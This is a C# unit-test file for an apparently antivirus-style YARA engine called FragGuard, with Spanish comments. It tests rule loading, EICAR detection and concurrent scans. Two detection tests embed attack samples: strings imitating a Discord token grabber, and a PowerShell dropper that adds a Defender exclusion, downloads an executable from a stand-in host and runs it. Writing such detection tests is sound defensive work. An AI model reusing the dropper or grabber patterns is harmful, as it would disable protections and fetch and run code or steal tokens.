using System.Text;
using FragGuard.Core.Detection;
using FragGuard.Shared.Models;

namespace FragGuard.Core.Tests;

public class YaraEngineTests : IDisposable
{
    private readonly TestEnvironment _env = new();

    /// <summary>
    /// Construye la cadena EICAR en tiempo de ejecución (invertida en el código fuente) para que
    /// ningún antivirus marque el ensamblado de tests. Solo se usa en memoria, nunca se escribe en disco.
    /// </summary>
    internal static byte[] BuildEicar()
    {
        const string reversed = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
        char[] chars = reversed.ToCharArray();
        Array.Reverse(chars);
        return Encoding.ASCII.GetBytes(chars);
    }

    [Fact]
    public void AllShippedRules_Compile()
    {
        var yara = _env.Get<IYaraEngine>();
        // 8 reglas de ejemplo + 1 de test. Si alguna no compila, YaraEngine la omite y este número baja.
        Assert.Equal(9, yara.RuleCount);
        Assert.NotEqual("none", yara.RulesVersion);
    }

    [Fact]
    public void Eicar_InMemory_IsDetected()
    {
        var yara = _env.Get<IYaraEngine>();
        byte[] eicar = BuildEicar();

        var threats = yara.ScanMemory(eicar, eicar.Length);

        var t = Assert.Single(threats);
        Assert.Equal("FG_Test_EICAR", t.Name);
        Assert.Equal(ThreatSeverity.High, t.Severity);
        Assert.Equal("Test", t.Category);
        Assert.Equal(DetectionSource.Yara, t.Source);
    }

    [Fact]
    public void Eicar_NotAtOffsetZero_IsNotDetected()
    {
        var yara = _env.Get<IYaraEngine>();
        byte[] data = Encoding.ASCII.GetBytes("padding ").Concat(BuildEicar()).ToArray();
        Assert.Empty(yara.ScanMemory(data, data.Length));
    }

    [Fact]
    public void CleanBuffer_HasNoMatches()
    {
        var yara = _env.Get<IYaraEngine>();
        byte[] data = Encoding.UTF8.GetBytes("Hola, esto es un archivo normal de configuración de un juego.");
        Assert.Empty(yara.ScanMemory(data, data.Length));
    }

    [Fact]
    public void DiscordTokenGrabber_SampleStrings_AreDetected()
    {
        var yara = _env.Get<IYaraEngine>();
        // Cadenas sueltas que imitan un grabber (no es código funcional)
        string fake = @"C:\Users\x\AppData\Roaming\discord\Local Storage\leveldb  dQw4w9WgXcQ:abc  https://discord.com/api/webhooks/123456789/abc";
        byte[] data = Encoding.UTF8.GetBytes(fake);
        var threats = yara.ScanMemory(data, data.Length);
        Assert.Contains(threats, t => t.Name == "FG_Stealer_Discord_TokenGrabber");
    }

    [Fact]
    public void DefenderExclusionDropper_IsDetected()
    {
        var yara = _env.Get<IYaraEngine>();
        string script = "Add-MpPreference -ExclusionPath $env:TEMP\nInvoke-WebRequest http://x/a.exe -OutFile a.exe\nStart-Process a.exe";
        byte[] data = Encoding.UTF8.GetBytes(script);
        Assert.Contains(yara.ScanMemory(data, data.Length), t => t.Name == "FG_Dropper_DefenderExclusion_Download");
    }

    [Fact]
    public void InvalidRuleFile_IsSkipped_OthersStillLoad()
    {
        File.WriteAllText(Path.Combine(_env.RulesDir, "broken.yar"), "rule roto { condition: ");
        var yara = _env.Get<IYaraEngine>();
        yara.LoadRules(_env.RulesDir);
        Assert.Equal(9, yara.RuleCount);
    }

    [Fact]
    public async Task ConcurrentScans_AndReload_DoNotCrash()
    {
        // El servicio analiza con varios hilos a la vez y puede recargar reglas en caliente:
        // esto no debe provocar nunca un AccessViolation dentro de libyara.
        var yara = _env.Get<IYaraEngine>();
        byte[] eicar = BuildEicar();
        byte[] marker = Encoding.UTF8.GetBytes("zz " + TestEnvironment.Marker);

        var scanners = Enumerable.Range(0, 8).Select(i => Task.Run(() =>
        {
            for (int n = 0; n < 300; n++)
            {
                var data = (n % 2 == 0) ? eicar : marker;
                var threats = yara.ScanMemory(data, data.Length);
                // Durante una recarga puede haber un instante sin reglas; si hay resultado, debe ser correcto.
                Assert.True(threats.Count <= 1);
            }
        }));
        var reloader = Task.Run(() =>
        {
            for (int n = 0; n < 5; n++)
                yara.LoadRules(_env.RulesDir);
        });

        await Task.WhenAll(scanners.Append(reloader));
        Assert.Equal(9, yara.RuleCount);
    }

    public void Dispose() => _env.Dispose();
}
